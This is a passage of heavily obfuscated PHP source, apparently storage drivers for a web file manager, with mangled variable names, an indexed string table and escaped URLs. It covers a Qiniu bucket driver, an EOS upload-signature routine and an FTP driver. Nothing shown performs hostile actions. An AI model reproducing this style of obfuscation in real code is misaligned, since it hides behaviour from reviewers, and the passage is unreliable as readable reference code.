$÷á°¢„ƒ[12] : $Ô˜Ó . $÷á°¢„ƒ[8]; $ÆÙó­à‹ = $÷á°¢„ƒ[12]; $¹ñØú¶ = 500; $éÁÆ“ûÓ = $÷á°¢„ƒ[8]; $Ö»ÃŸ˜ = $Ûş›çÒ = 0; while (!0) { check_abort(); list($º†ÒÈ–”, $ƒ˜»Ò») = $this->bucketManager->listFiles($this->bucket, $¡“¹¬ç–, $ÆÙó­à‹, $¹ñØú¶, $éÁÆ“ûÓ); if ($ƒ˜»Ò») { break; } $ÆÙó­à‹ = array_key_exists($÷á°¢„ƒ[1514], $º†ÒÈ–”) ? $ÆÙó­à‹ = $º†ÒÈ–”[$÷á°¢„ƒ[1569]] : $÷á°¢„ƒ[12]; if ($ìü‘üÒ) { if (!empty($º†ÒÈ–”[$÷á°¢„ƒ[1570]])) { $Ö»ÃŸ˜ += count($º†ÒÈ–”[$÷á°¢„ƒ[1570]]); } if (!empty($º†ÒÈ–”[$÷á°¢„ƒ[1571]])) { $Ûş›çÒ += count($º†ÒÈ–”[$÷á°¢„ƒ[1571]]); } if ($ÆÙó­à‹ === $÷á°¢„ƒ[12]) { break; } continue; } if ($ÌûÜŠ¬) { if (!empty($º†ÒÈ–”[$÷á°¢„ƒ[1570]])) { return !0; } } else { if (!empty($º†ÒÈ–”[$÷á°¢„ƒ[1571]])) { return !0; } } if ($ÆÙó­à‹ === $÷á°¢„ƒ[12]) { break; } } if ($ìü‘üÒ) { return array($÷á°¢„ƒ[242] => $Ö»ÃŸ˜, $÷á°¢„ƒ[243] => $Ûş›çÒ); } return !1; } public function listAll($Ê×§¡ç) { $ƒ¦İ´ó¥ =& $_SERVER[Î·Ü›öğ]; $®É–ÀÑí = $this->fileList($Ê×§¡ç, $ƒ¦İ´ó¥[12], !0); $Â¯ºíŒ = array_to_keyvalue($®É–ÀÑí[$ƒ¦İ´ó¥[86]], $ƒ¦İ´ó¥[32]); foreach ($®É–ÀÑí[$ƒ¦İ´ó¥[85]] as $ÅÎè×´) { if (is_string($ÅÎè×´)) { $Â¯ºíŒ[$ÅÎè×´] = array($ƒ¦İ´ó¥[79] => 0); } } return $this->listAllFiles($Ê×§¡ç, $Â¯ºíŒ); } private function fileList($ÓÙÊÔ†, $…ÆŞÌ© = '', $¾­îÕ¸‰ = 0) { $‰ æµçû =& $_SERVER[Î·Ü›öğ]; $ÓÙÊÔ† = trim($ÓÙÊÔ†, $‰ æµçû[8]); $ºüìöÛŞ = empty($ÓÙÊÔ†) && $ÓÙÊÔ† !== $‰ æµçû[231] ? $‰ æµçû[12] : $ÓÙÊÔ† . $‰ æµçû[8]; $«©ˆ­Î± = $‰ æµçû[12]; $ÄÎ¶† = 1000; $íşÒú£Û = $©Áú÷ = array(); while (!0) { check_abort(); list($öµƒ­ºÀ, $¬†‰­ı”) = $this->bucketManager->listFiles($this->bucket, $ºüìöÛŞ, $«©ˆ­Î±, $ÄÎ¶†, $…ÆŞÌ©); if ($¬†‰­ı”) { break; } $«©ˆ­Î± = array_key_exists($‰ æµçû[1514], $öµƒ­ºÀ) ? $«©ˆ­Î± = $öµƒ­ºÀ[$‰ æµçû[1569]] : $‰ æµçû[12]; $ı¿¥Ôµã = isset($öµƒ­ºÀ[$‰ æµçû[1570]]) ? $öµƒ­ºÀ[$‰ æµçû[1570]] : array(); $ŞÜö‰ƒÜ = isset($öµƒ­ºÀ[$‰ æµçû[1571]]) ? $öµƒ­ºÀ[$‰ æµçû[1571]] : array(); foreach ($ı¿¥Ôµã as $šÓó‹Ü›) { if ($šÓó‹Ü›[$‰ æµçû[97]] == $ºüìöÛŞ) { continue; } $¯ŒõÌŒù = $šÓó‹Ü›[$‰ æµçû[97]]; $ ÑÃª°­ = $šÓó‹Ü›[$‰ æµçû[1567]]; $šÓó‹Ü›[$‰ æµçû[32]] = $¯ŒõÌŒù; $šÓó‹Ü›[$‰ æµçû[79]] = $ ÑÃª°­; $ŠßÅË­Ä = $ ÑÃª°­ == 0 && substr($¯ŒõÌŒù, strlen($¯ŒõÌŒù) - 1, 1) == $‰ æµçû[8] ? !0 : !1; $this->cacheMethodInfoSet($¯ŒõÌŒù, $ŠßÅË­Ä, $šÓó‹Ü›); if ($ŠßÅË­Ä) { $íşÒú£Û[] = $¯ŒõÌŒù; continue; } $©Áú÷[] = $¾­îÕ¸‰ ? $šÓó‹Ü› : $¯ŒõÌŒù; } foreach ($ŞÜö‰ƒÜ as $¯ŒõÌŒù) { if ($¯ŒõÌŒù == $ºüìöÛŞ) { continue; } $íşÒú£Û[] = $¯ŒõÌŒù; $this->cacheMethodInfoSet($¯ŒõÌŒù, !0); } if ($«©ˆ­Î± === $‰ æµçû[12]) { break; } } $this->cacheMethodInfoSet($ÓÙÊÔ†, !0); return array($‰ æµçû[85] => $íşÒú£Û, $‰ æµçû[86] => $©Áú÷); } public function canRead($Î‚Á³ƒ) { return $this->exist($Î‚Á³ƒ) ? !0 : !1; } public function canWrite($’àŞ‹Óô) { return $this->exist($’àŞ‹Óô) ? !0 : !1; } public function getContent($¹‹ìøœ) { return $this->fileSubstr($¹‹ìøœ, 0, -1); } public function setContent($å«ŞÈïŞ, $üŒ†»ñ„ = '') { $ğØÅ†¸² = $this->tempFile($this->pathThis($å«ŞÈïŞ)); file_put_contents($ğØÅ†¸², $üŒ†»ñ„); if ($this->upload($å«ŞÈïŞ, $ğØÅ†¸²)) { $this->tempFileRemve($ğØÅ†¸²); return !0; } return !1; } public function refreshUrls($“ìŒÙïù) { $ê¾íÄåŒ =& $_SERVER[Î·Ü›öğ]; $»ú×Ç–™ = array(); if (is_array($“ìŒÙïù)) { foreach ($“ìŒÙïù as $ÅáÛ£) { $»ú×Ç–™[] = $this->link($ÅáÛ£); } } else { $»ú×Ç–™[] = $this->link($“ìŒÙïù); } $Ğ¶¡Ç‚¼ = new Qiniu\Cdn\CdnManager($this->auth); list($ğ°ó¹—µ, $îÒ¹İ™¢) = $Ğ¶¡Ç‚¼->refreshUrls($»ú×Ç–™); if ($îÒ¹İ™¢) { return !1; } return $ğ°ó¹—µ[$ê¾íÄåŒ[1294]] == $ê¾íÄåŒ[849] ? !0 : !1; } public function fileSubstr($«Æ†åä¤, $üÁÍìØÄ, $ôÌ¾Âì) { $Ğà’õü— =& $_SERVER[Î·Ü›öğ]; if (!($îá¯£ˆï = $this->link($«Æ†åä¤))) { return !1; } $ŠÆ±Ÿ™ = !1; if ($ôÌ¾Âì > 0) { $ÒœÆ«ªƒ = $üÁÍìØÄ + $ôÌ¾Âì - 1; $ŠÆ±Ÿ™ = array($Ğà’õü—[1572] . $üÁÍìØÄ . $Ğà’õü—[464] . $ÒœÆ«ªƒ); } $¸×óæ¥Ö = url_request($îá¯£ˆï, $Ğà’õü—[1533], !1, $ŠÆ±Ÿ™); return $¸×óæ¥Ö[$Ğà’õü—[839]] ? $¸×óæ¥Ö[$Ğà’õü—[1317]] : !1; } public function upload($¾‚¼‚, $ŠáìÎ¬î, $òÖªèõö = false, $ç¶…µÜ³ = REPEAT_REPLACE) { $ëÉ“ÑóŒ = new Qiniu\Storage\UploadManager(); $‚úîÈ±Ø = $this->auth->uploadToken($this->bucket, $¾‚¼‚); $İğ¾Ê„š = get_file_mime(get_path_ext($ŠáìÎ¬î)); list($¬ğ€„ˆ©, $• Ô¼§) = $ëÉ“ÑóŒ->putFile($‚úîÈ±Ø, $¾‚¼‚, $ŠáìÎ¬î, null, $İğ¾Ê„š); return $• Ô¼§ ? !1 : $this->getPathOuter($¾‚¼‚); } public function uploadFormData($ª€¶Ø¾Ğ, $¬ù¯Ç»ì = 3600) { return $this->uploadToken($ª€¶Ø¾Ğ, $¬ù¯Ç»ì); } public function uploadMultiData($Š“œ§Œ˜, $µ¿àïä¡ = 3600) { return $this->uploadToken($Š“œ§Œ˜, $µ¿àïä¡); } private function uploadToken($€Îú×ñš, $ÆšŸ©–ò = 3600) { $Áû³õŒ· =& $_SERVER[Î·Ü›öğ]; $ı«‘¦ƒŒ = $ÆšŸ©–ò; $¹¬®çÖ“ = array($Áû³õŒ·[1573] => $Áû³õŒ·[1574]); $®—µñ¼ä = $€Îú×ñš; $ğš¥ìİÒ = $this->auth->uploadToken($this->bucket, $®—µñ¼ä, $ı«‘¦ƒŒ, $¹¬®çÖ“, !0); $ãšÒà• = empty($this->region) || $this->region == $Áû³õŒ·[1575] ? $Áû³õŒ·[12] : $Áû³õŒ·[464] . $this->region; $¹Ñ¢»Ş“ = http_type() . "\72\x2f\57\x75\160\154\x6f\141\x64{$ãšÒà•}\56\x71\151\156\x69\165\x70\56\x63\157\x6d\57"; return array($Áû³õŒ·[1576] => $ğš¥ìİÒ, $Áû³õŒ·[1577] => $¹Ñ¢»Ş“); } public function download($´£¦©æ, $ô½ôâ§æ) { $…èşÙ’ = IO::getPathInner(IO::mkfile($ô½ôâ§æ)); if (!($àİŸò‰ = $this->link($´£¦©æ))) { return !1; } $¾Ú¤Úãû = 0; $±‰èçÑ¡ = 1024 * 200; $Í–³Õ· = fopen($…èşÙ’, $_SERVER[Î·Ü›öğ][1578]); while (!0) { $ÛÈ˜ãÕŠ = $this->fileSubstr($´£¦©æ, $¾Ú¤Úãû, $±‰èçÑ¡); if ($ÛÈ˜ãÕŠ === !1) { return !1; } fwrite($Í–³Õ·, $ÛÈ˜ãÕŠ); $¾Ú¤Úãû += $±‰èçÑ¡; if (strlen($ÛÈ˜ãÕŠ) < $±‰èçÑ¡) { break; } } fclose($Í–³Õ·); return $ô½ôâ§æ; } public function link($Œ²¹ˆ–À, $„óÂøŸ = '') { if (!$this->isFile($Œ²¹ˆ–À)) { return !1; } $òû°Ş¦ = $this->getHost() . $_SERVER[Î·Ü›öğ][8] . $this->pathEncode($Œ²¹ˆ–À) . $„óÂøŸ; return $this->auth->privateDownloadUrl($òû°Ş¦, 3600 * 12); } public function fileOut($üôİ«¥, $¤¢Ôúäß = false, $µ©ˆ‡¼² = false, $šßí‚â = '') { $ú£æ¸û— =& $_SERVER[Î·Ü›öğ]; if ($this->isFileOutServer()) { return $this->fileOutServer($üôİ«¥, $¤¢Ôúäß, $µ©ˆ‡¼², $šßí‚â); } if (!$µ©ˆ‡¼²) { $µ©ˆ‡¼² = $this->pathThis($üôİ«¥); } $ˆ³ÏĞ‚’ = $¤¢Ôúäß ? $ú£æ¸û—[1579] . rawurlencode($µ©ˆ‡¼²) : $ú£æ¸û—[12]; $©å²±ò = $this->link($üôİ«¥, $ˆ³ÏĞ‚’); $this->fileOutLink($©å²±ò); } public function fileOutServer($ÏÜ«Òß¹, $ôê—€¤ = false, $ëØüôïï = false, $¶ó°œæ† = '') { parent::fileOut($ÏÜ«Òß¹, $ôê—€¤, $ëØüôïï, $¶ó°œæ†); } public function fileOutImage($åô¡Œà, $¡Ï…¹‹¸ = 250) { if ($this->size($åô¡Œà) > 1024 * 1024 * 20) { return $this->fileOutImageServer($åô¡Œà, $¡Ï…¹‹¸); } $ïÖß«û† = $this->link($åô¡Œà, $_SERVER[Î·Ü›öğ][1580] . $¡Ï…¹‹¸); $this->fileOutLink($ïÖß«û†); } public function fileOutImageServer($Ê”¤ğ‰ì, $¾¿ÈÅÑµ = 250) { parent::fileOutImage($Ê”¤ğ‰ì, $¾¿ÈÅÑµ); } public function hashMd5($˜šÓ©æ) { $ŠÙ¤ÂøÖ =& $_SERVER[Î·Ü›öğ]; $å¯«±±õ = $this->objectMeta($˜šÓ©æ); return isset($å¯«±±õ[$ŠÙ¤ÂøÖ[248]]) ? $å¯«±±õ[$ŠÙ¤ÂøÖ[248]] : !1; $®ª²¡‚ = $this->link($˜šÓ©æ, $ŠÙ¤ÂøÖ[1581]); } public function size($ª ±ò­Ğ) { $¾–ÓèÌ¶ = $this->objectMeta($ª ±ò­Ğ); return $¾–ÓèÌ¶ ? $¾–ÓèÌ¶[$_SERVER[Î·Ü›öğ][79]] : 0; } public function info($—×ç…¡ò) { if ($this->isFolder($—×ç…¡ò)) { return $this->folderInfo($—×ç…¡ò); } else { if ($this->isFile($—×ç…¡ò)) { return $this->fileInfo($—×ç…¡ò); } } return !1; } public function exist($¹»Úã´Å) { return $this->isFile($¹»Úã´Å) || $this->isFolder($¹»Úã´Å); } public function isFile($•Ã©¿¿Û) { return !$this->isFolder($•Ã©¿¿Û) && $this->objectMeta($•Ã©¿¿Û); } public function isFolder($µ¸ï‰š—) { return $this->cacheMethod($_SERVER[Î·Ü›öğ][180], $µ¸ï‰š—); } protected function objectMeta($ì•©ÀŒ) { return $this->cacheMethod($_SERVER[Î·Ü›öğ][182], $ì•©ÀŒ); } protected function _objectMeta($¹¤çñÑ) { $¾¬á÷¿ =& $_SERVER[Î·Ü›öğ]; list($ıå•««, $ÄæŒ¾¹€) = $this->bucketManager->stat($this->bucket, $¹¤çñÑ); if ($ıå•««) { $ıå•««[$¾¬á÷¿[79]] = intval($ıå•««[$¾¬á÷¿[1567]]); } return $ıå•««; } protected function _isFolder($™ÏÚ®„Ï) { $ç¥®†á¦ =& $_SERVER[Î·Ü›öğ]; if ($™ÏÚ®„Ï == $ç¥®†á¦[12] || $™ÏÚ®„Ï == $ç¥®†á¦[8]) { return !0; } list($ »Åæ÷», $ÖâÍ¼¾£) = $this->bucketManager->listFiles($this->bucket, trim($™ÏÚ®„Ï, $ç¥®†á¦[8]) . $ç¥®†á¦[8], $ç¥®†á¦[12], 1, $ç¥®†á¦[8]); return !empty($ »Åæ÷»[$ç¥®†á¦[1570]]) || !empty($ »Åæ÷»[$ç¥®†á¦[1571]]) ? !0 : !1; } } goto A²éºÜ‹¾³; Eâ­óÍèâ®: class PathDriverEDS extends PathDriverBaseS3 { public function __construct($Õ•Áô¸) { parent::__construct($Õ•Áô¸); $this->setSignVersion($_SERVER[Î·Ü›öğ][250]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($±à­ğ³¼) { parent::__construct($±à­ğ³¼); $this->setSignVersion($_SERVER[Î·Ü›öğ][250]); } public function uploadFormData($‹êùÔ†ş, $ÈÌòÃë = 3600) { $¼£¹ô‡Ó =& $_SERVER[Î·Ü›öğ]; $èõ«Œ›Ğ = $¼£¹ô‡Ó[232]; $‚¾ÍöàÏ = $¼£¹ô‡Ó[260]; $ÃÇ½«’ = $¼£¹ô‡Ó[62]; $„¥º˜åÄ = gmdate($¼£¹ô‡Ó[261]); $şşÊÓÕù = gmdate($¼£¹ô‡Ó[262]); $³’²“˜æ = $¼£¹ô‡Ó[263]; $€á»©ç± = $ÈÌòÃë . $¼£¹ô‡Ó[12]; $Ù¸Ç¬òÂ = $¼£¹ô‡Ó[264]; $Ö¡¤¬¿¶ = array($this->accessKey, $şşÊÓÕù, $this->region, $ÃÇ½«’, $³’²“˜æ); $Àï¢Ì« = implode($¼£¹ô‡Ó[8], $Ö¡¤¬¿¶); $ĞÜ‡·Àç = array($¼£¹ô‡Ó[265] => gmdate($¼£¹ô‡Ó[1450], strtotime($¼£¹ô‡Ó[267])), $¼£¹ô‡Ó[268] => array(array($¼£¹ô‡Ó[269] => $this->bucket), array($¼£¹ô‡Ó[309] => $èõ«Œ›Ğ), array($¼£¹ô‡Ó[270], $¼£¹ô‡Ó[271], $¼£¹ô‡Ó[12]), array($¼£¹ô‡Ó[270], $¼£¹ô‡Ó[272], $¼£¹ô‡Ó[12]), array($¼£¹ô‡Ó[270], $¼£¹ô‡Ó[310], $¼£¹ô‡Ó[12]), array($¼£¹ô‡Ó[273] => $Ù¸Ç¬òÂ), array($¼£¹ô‡Ó[274] => $Àï¢Ì«), array($¼£¹ô‡Ó[275] => $‚¾ÍöàÏ), array($¼£¹ô‡Ó[276] => $„¥º˜åÄ), array($¼£¹ô‡Ó[277] => $€á»©ç±))); $‹£Ûò…İ = base64_encode(json_encode($ĞÜ‡·Àç)); $êÂ°àåŒ = hash_hmac($¼£¹ô‡Ó[278], $şşÊÓÕù, $¼£¹ô‡Ó[279] . $this->secret, !0); $³Œâûíµ = hash_hmac($¼£¹ô‡Ó[278], $this->region, $êÂ°àåŒ, !0); $¦ÂËÛß = hash_hmac($¼£¹ô‡Ó[278], $ÃÇ½«’, $³Œâûíµ, !0); $íºÌÊ¾Ş = hash_hmac($¼£¹ô‡Ó[278], $³’²“˜æ, $¦ÂËÛß, !0); $“÷üÁê± = hash_hmac($¼£¹ô‡Ó[278], $‹£Ûò…İ, $íºÌÊ¾Ş); $“‘¾³‡¦ = array($¼£¹ô‡Ó[249] => $¼£¹ô‡Ó[12], $¼£¹ô‡Ó[297] => $¼£¹ô‡Ó[12], $¼£¹ô‡Ó[309] => $èõ«Œ›Ğ, $¼£¹ô‡Ó[273] => $Ù¸Ç¬òÂ, $¼£¹ô‡Ó[280] => $‹£Ûò…İ, $¼£¹ô‡Ó[311] => $Àï¢Ì«, $¼£¹ô‡Ó[312] => $‚¾ÍöàÏ, $¼£¹ô‡Ó[313] => $„¥º˜åÄ, $¼£¹ô‡Ó[314] => $€á»©ç±, $¼£¹ô‡Ó[315] => $“÷üÁê±, $¼£¹ô‡Ó[209] => $this->getHost()); return $“‘¾³‡¦; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($¯¦€•µ›) { parent::__construct(); if (count($¯¦€•µ›) > 0) { $this->_init($¯¦€•µ›); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($Ó¢¨ ŸÁ) { $ÏÈ¤ãàÖ =& $_SERVER[Î·Ü›öğ]; global $config; $this->appCharset = $config[$ÏÈ¤ãàÖ[1476]]; $this->systemCharset = $config[$ÏÈ¤ãàÖ[1477]]; if (isset($Ó¢¨ ŸÁ[$ÏÈ¤ãàÖ[1478]]) && $Ó¢¨ ŸÁ[$ÏÈ¤ãàÖ[1478]]) { $this->systemCharset = $Ó¢¨ ŸÁ[$ÏÈ¤ãàÖ[1478]]; } } public function iconvApp($öÊˆÊàÜ) { return $this->iconvTo($öÊˆÊàÜ, $this->systemCharset, $this->appCharset); } public function iconvSystem($™¨åÍ€Â) { return $this->iconvTo($™¨åÍ€Â, $this->appCharset, $this->systemCharset); } public function getPathOuter($–¤íÖ) { $î®ÃÔğó =& $_SERVER[Î·Ü›öğ]; $¾‚®¾ñ› = $this->iconvApp($this->pathBase); $–¤íÖ = $this->iconvApp($–¤íÖ); if (substr($¾‚®¾ñ›, 0, 2) == $î®ÃÔğó[1448]) { $¾‚®¾ñ› = BASIC_PATH . substr($¾‚®¾ñ›, 2); } if (substr($–¤íÖ, 0, 2) == $î®ÃÔğó[1448]) { $–¤íÖ = BASIC_PATH . substr($–¤íÖ, 2); } $¾‚®¾ñ› = KodIO::clear($¾‚®¾ñ›); $–¤íÖ = KodIO::clear($–¤íÖ); $–¤íÖ = substr($–¤íÖ, strlen($¾‚®¾ñ›)); if (empty($this->pathDriver)) { return $–¤íÖ; } return $this->pathDriver . $î®ÃÔğó[8] . ltrim($–¤íÖ, $î®ÃÔğó[8]); } private function _init($­ãÍÃ·¨ = array()) { $û”·èº› =& $_SERVER[Î·Ü›öğ]; if (!function_exists($û”·èº›[1479])) { throw new Exception(LNG($û”·èº›[1480])); } $this->config = $­ãÍÃ·¨; $this->charsetReset($­ãÍÃ·¨); foreach ($­ãÍÃ·¨ as $¬Ä•±â˜ => $ÄÈÀû¤) { if (isset($this->{$¬Ä•±â˜})) { $this->{$¬Ä•±â˜} = $ÄÈÀû¤; } } return $this->_login($­ãÍÃ·¨); } private function _login($¶­ş¹Ìö) { $Ä»¬­› =& $_SERVER[Î·Ü›öğ]; static $¶ñ´–™¹ = array(); $íÂÛ¢ï³ = md5(json_encode($¶­ş¹Ìö)); if (isset($¶ñ´–™¹[$íÂÛ¢ï³])) { foreach ($¶ñ´–™¹[$íÂÛ¢ï³] as $½Á²ëŸ» => $ı¸‘Ñşš) { $this->{$½Á²ëŸ»} = $ı¸‘Ñşš; } return !0; } $‚¡ùß¼Ø = parse_url(trim($this->server, $Ä»¬­›[8])); $this->host = $‚¡ùß¼Ø[$Ä»¬­›[209]]; $£¼ôÕñó = isset($‚¡ùß¼Ø[$Ä»¬­›[208]]) && $‚¡ùß¼Ø[$Ä»¬­›[208]] == $Ä»¬­›[1481] ? !0 : !1; $this->scheme = $£¼ôÕñó ? $Ä»¬­›[1482] : $Ä»¬­›[1483]; $this->port = isset($‚¡ùß¼Ø[$Ä»¬­›[210]]) ? $‚¡ùß¼Ø[$Ä»¬­›[210]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($Ä»¬­›[1484]) . $this->host . $Ä»¬­›[4] . $this->port, !0); return !1; } $·¤Ì¦è = @ftp_login($this->connect, $this->username, $this->userpass); if (!$·¤Ì¦è) { $this->writeLog(LNG($Ä»¬­›[1485]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $Ä»¬­›[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ªûÕ¯©‡ = $this->pasv == $Ä»¬­›[91] ? !0 : !1; @ftp_pasv($this->connect, $ªûÕ¯©‡); $¶ñ´–™¹[$íÂÛ¢ï³] = array($Ä»¬­›[1486] => $this->connect, $Ä»¬­›[209] => $this->host, $Ä»¬­›[208] => $this->scheme, $Ä»¬­›[210] => $this->port); return $·¤Ì¦è; } private function _isconn($½êà§ª¯ = true) { if (is_resource($this->connect)) { return !0; } if (!$½êà§ª¯) { return !1; } return $this->_login($this->config); } public function mkfile($ŒŞƒí¸İ, $¯úâñàõ = '', $¶…Êéî¯ = REPEAT_RENAME) { if ($this->setContent($ŒŞƒí¸İ, $¯úâñàõ)) { return $this->getPathOuter($ŒŞƒí¸İ); } $this->writeLog(LNG($_SERVER[Î·Ü›öğ][1487]), !0); return !1; } public function mkdir($Ó¯‡ˆ¯, $†½ÏòÇ› = REPEAT_SKIP) { $¥À¢‰† =& $_SERVER[Î·Ü›öğ]; if (!$Ó¯‡ˆ¯ || $Ó¯‡ˆ¯ == $¥À¢‰†[8]) { return !0; } if (!$this->_isconn()) { return !1; } $Ó¯‡ˆ¯ = $this->iconvSystem($Ó¯‡ˆ¯); if ($this->_isFolder($Ó¯‡ˆ¯) || @ftp_mkdir($this->connect, $Ó¯‡ˆ¯)) { return $this->getPathOuter($Ó¯‡ˆ¯); } if (!$this->mkdir($this->pathFather($Ó¯‡ˆ¯))) { return !1; } if ($Ó¯‡ˆ¯ = @ftp_mkdir($this->connect, $Ó¯‡ˆ¯)) { return $this->getPathOuter($Ó¯‡ˆ¯); } $°²¹€Ã¹ = __FUNCTION__ . $¥À¢‰†[1488]; $this->writeLog($°²¹€Ã¹, !0); return !1; } public function copyFile($‚Ö¨šÏÔ, $“‡ŸÎè¶) { if (!$this->_isconn()) { return !1; } $ŞÁŸÃŸ = $this->pathThis($this->iconvSystem($‚Ö¨šÏÔ)); $ÊŸÓ¸šĞ = $this->tempFile($ŞÁŸÃŸ); $—¯³ĞÆ = $this->iconvApp($ÊŸÓ¸šĞ); $this->download($‚Ö¨šÏÔ, $—¯³ĞÆ); $Ş¶æ©Ûï = $this->upload($“‡ŸÎè¶, $—¯³ĞÆ); $this->tempFileRemve($ÊŸÓ¸šĞ); return $Ş¶æ©Ûï; } public function moveFile($æ‹®ú”ó, $¼’²Š„”) { if (!$this->_isconn()) { return !1; } $æ‹®ú”ó = $this->iconvSystem($æ‹®ú”ó); $¼’²Š„” = $this->iconvSystem($¼’²Š„”); $¬´¤¯‰¾ = @ftp_rename($this->connect, $æ‹®ú”ó, $¼’²Š„”); if (!$¬´¤¯‰¾) { $this->writeLog(__FUNCTION__ . $_SERVER[Î·Ü›öğ][1488], !0); return !1; } return $this->getPathOuter($¼’²Š„”); } public function delFile($Áú•¤õÛ) { if (!$this->_isconn()) { return !1; } $Áú•¤õÛ = $this->iconvSystem($Áú•¤õÛ); $ÔûÙ„˜™ = @ftp_delete($this->connect, $Áú•¤õÛ); if (!$ÔûÙ„˜™) { $this->writeLog(__FUNCTION__ . $_SERVER[Î·Ü›öğ][1488], !0); } return $ÔûÙ„˜™; } public function delFolder($ÛéÍ‰³ª) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $¦©ùş¡ú = $¤Áşêš— = array(); $this->fileList($ÛéÍ‰³ª, $¦©ùş¡ú, $¤Áşêš—, !0); $this->listItemCache = !0; foreach ($¤Áşêš— as $§ùŒ½¥Ç) { $¿©á‹Ë° = $this->iconvSystem($§ùŒ½¥Ç[$_SERVER[Î·Ü›öğ][32]]); $Ç¯Œ»Ó² = @ftp_delete($this->connect, $¿©á‹Ë°); if (!$Ç¯Œ»Ó²) { return !1; } } foreach ($¦©ùş¡ú as $¿©á‹Ë°) { $¿©á‹Ë° = $this->iconvSystem($¿©á‹Ë°); $Ç¯Œ»Ó² = @ftp_rmdir($this->connect, $¿©á‹Ë°); if (!$Ç¯Œ»Ó²) { return !1; } } $ÛéÍ‰³ª = $this->iconvSystem($ÛéÍ‰³ª); return @ftp_rmdir($this->connect, $ÛéÍ‰³ª); } public function rename($¼÷÷Ùì, $ê¯şÅúı) { $à‰Æ˜Ó =& $_SERVER[Î·Ü›öğ]; if (!$this->_isconn()) { return !1; } $¦ôÃ¿ƒü = $this->fileNameAuto($this->pathFather($¼÷÷Ùì), $ê¯şÅúı); $¦ôÃ¿ƒü = $this->iconvSystem($¦ôÃ¿ƒü); $¼÷÷Ùì = $this->iconvSystem($¼÷÷Ùì); $²«€©„ = $this->pathFather($¼÷÷Ùì); $Ş¶…·èÉ = rtrim($²«€©„, $à‰Æ˜Ó[8]) . $à‰Æ˜Ó[8] . $¦ôÃ¿ƒü; $Æ«ÇÄùß = @ftp_rename($this->connect, $¼÷÷Ùì, $Ş¶…·èÉ); if (!$Æ«ÇÄùß) { $this->writeLog(__FUNCTION__ . $à‰Æ˜Ó[1488], !0); return !1; } $Ş¶…·èÉ = $this->iconvApp($Ş¶…·èÉ); return $this->getPathOuter($Ş¶…·èÉ); } private function folderInfo($’÷Œ°¸, $Îê†ƒ = false) { $‹«Ş‡ÍÍ =& $_SERVER[Î·Ü›öğ]; $ñº•ìæ¶ = array($‹«Ş‡ÍÍ[32] => $this->pathThis($’÷Œ°¸), $‹«Ş‡ÍÍ[87] => $this->getPathOuter($‹«Ş‡ÍÍ[8] . $’÷Œ°¸), $‹«Ş‡ÍÍ[33] => $‹«Ş‡ÍÍ[78]); if ($Îê†ƒ) { return $ñº•ìæ¶; } $ñº•ìæ¶[$‹«Ş‡ÍÍ[234]] = $ñº•ìæ¶[$‹«Ş‡ÍÍ[88]] = 0; $ñº•ìæ¶[$‹«Ş‡ÍÍ[235]] = $ñº•ìæ¶[$‹«Ş‡ÍÍ[236]] = !0; return $ñº•ìæ¶; } private function fileInfo($ø–›şŸ, $ÜÙŞĞ´ = false, $Æ‘Ç˜Î¶ = array()) { $Å†ù¢§ƒ =& $_SERVER[Î·Ü›öğ]; $Ë¥‘ÅÊÒ = array($Å†ù¢§ƒ[32] => $this->pathThis($ø–›şŸ), $Å†ù¢§ƒ[87] => $this->getPathOuter($Å†ù¢§ƒ[8] . $ø–›şŸ), $Å†ù¢§ƒ[33] => $Å†ù¢§ƒ[233], $Å†ù¢§ƒ[79] => isset($Æ‘Ç˜Î¶[$Å†ù¢§ƒ[79]]) ? $Æ‘Ç˜Î¶[$Å†ù¢§ƒ[79]] : 0, $Å†ù¢§ƒ[169] => $this->ext($ø–›şŸ)); if ($ÜÙŞĞ´) { return $Ë¥‘ÅÊÒ; } $Ë¥‘ÅÊÒ[$Å†ù¢§ƒ[234]] = $Ë¥‘ÅÊÒ[$Å†ù¢§ƒ[88]] = 0; $Ë¥‘ÅÊÒ[$Å†ù¢§ƒ[235]] = $Ë¥‘ÅÊÒ[$Å†ù¢§ƒ[236]] = !0; $åÑ®éËÈ = $this->iconvSystem($ø–›şŸ); $Ë¥‘ÅÊÒ[$Å†ù¢§ƒ[88]] = @ftp_mdtm($this->connect, $åÑ®éËÈ); if (empty($Æ‘Ç˜Î¶)) { $Æ‘Ç˜Î¶ = $this->objectMeta($ø–›şŸ); if (!$Æ‘Ç˜Î¶) { return $Ë¥‘ÅÊÒ; } } $Ë¥‘ÅÊÒ[$Å†ù¢§ƒ[79]] = $Æ‘Ç˜Î¶[$Å†ù¢§ƒ[79]]; return $Ë¥‘ÅÊÒ; } public function size($ÍšËÌ¨İ) { $§ÁŸêè = $this->objectMeta($ÍšËÌ¨İ); return $§ÁŸêè ? $§ÁŸêè[$_SERVER[Î·Ü›öğ][79]] : 0; } public function info($ƒÈ“úÊ›) { if ($this->isFile($ƒÈ“úÊ›)) { return $this->fileInfo($ƒÈ“úÊ›, 0); } else { if ($this->isFolder($ƒÈ“úÊ›)) { return $this->folderInfo($ƒÈ“úÊ›); } } return !1; } private function fileList($›èÏÆ»ë, &$¨é¦ä×ü, &$Çƒè³Ô, $ÌÀ›²´Â = false) { $®¡ÂºœÏ =& $_SERVER[Î·Ü›öğ]; $›èÏÆ»ë = $this->iconvSystem($›èÏÆ»ë); if (!$this->isFolder($›èÏÆ»ë)) { return !1; } $›èÏÆ»ë = rtrim($›èÏÆ»ë, $®¡ÂºœÏ[8]) . $®¡ÂºœÏ[8]; check_abort(); $¼¶¢¯¬­ = @ftp_rawlist($this->connect, $›èÏÆ»ë); if (!$¼¶¢¯¬­) { $¼¶¢¯¬­ = array(); } $›šĞË° = array($®¡ÂºœÏ[10] => 1, $®¡ÂºœÏ[1393] => 1); foreach ($¼¶¢¯¬­ as $¶£©Ã„Ä) { $“‹ÌóÆ = $this->_listItem($¶£©Ã„Ä); if 